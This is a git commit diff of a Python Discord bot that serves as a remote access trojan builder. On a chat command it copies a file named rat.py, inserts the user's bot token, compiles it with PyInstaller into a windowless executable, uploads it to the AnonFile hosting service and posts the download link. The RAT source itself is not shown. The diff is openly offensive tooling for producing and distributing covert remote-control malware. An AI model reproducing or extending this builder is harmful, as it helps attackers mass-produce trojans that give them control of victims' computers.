f91f0889f934fec6153949012323808cdf1b2bae
ryane-joe <125251551+ryane-joe@users.noreply.github.com>
2023-04-03 01:59:19 +0530

    FINISHED
    the bot works and can handle multiple rquests

--- main.py
+++ main.py
@@ -1,34 +1,39 @@
-from anonfile import AnonFile
-import shutil
-from pathlib2 import Path
-import PyInstaller
-import os
 import discord
 from discord.ext import commands
-import time
-from time import sleep
+import threading
+from anonfile import AnonFile
+import shutil
+from pathlib import Path
+import os
+
+lock = threading.Lock()
+
 def upload(filepath):
     file_up = AnonFile()
     up = file_up.upload(filepath)
     return str(up.url.geturl())
-def gen(token):
-    src = r'rat.py'
-    dest = 'hi.py'
-    path = shutil.copyfile(src,dest)
-    file = Path(r'hi.py')
-    data = file.read_text()
-    sr = '#Enteer'
-    data = data.replace(sr,token)
-    file.write_text(data)
-    os.system("python -m PyInstaller --onefile --windowed --hidden-import=discord hi.py")
-    print(upload(r'dist/hi.exe'))
-    return upload(r'dist/hi.exe')
-bot = commands.Bot(command_prefix="#",intents=discord.Intents.all())
 
-@bot.command(name="gen")
+def gen(token, lock):
+    with lock:
+        src = r'rat.py'
+        dest = 'hi.py'
+        path = shutil.copyfile(src, dest)
+        file = Path(r'hi.py')
+        data = file.read_text()
+        sr = '#Enteer'
+        data = data.replace(sr,token)
+        file.write_text(data)
+        os.system("python -m PyInstaller --onefile --windowed --hidden-import=discord hi.py")
+        url = upload(r'dist/hi.exe')
+    return url
+
 async def generate_token(ctx, tkn: str):
-    x = gen(tkn)
-    await ctx.send(x)
+    t2 = threading.Thread(target=gen, args=(tkn, lock,), daemon=True)
+    t2.start()
+    url = await bot.loop.run_in_executor(None, gen, tkn, lock)
+    await ctx.send(url)
 
-if __name__ == "__main__":
-    bot.run("tkn")
+bot = commands.Bot(command_prefix="#",intents=discord.Intents.all())
+bot.command(name="gen")(generate_token)
+
+bot.run("tkn")
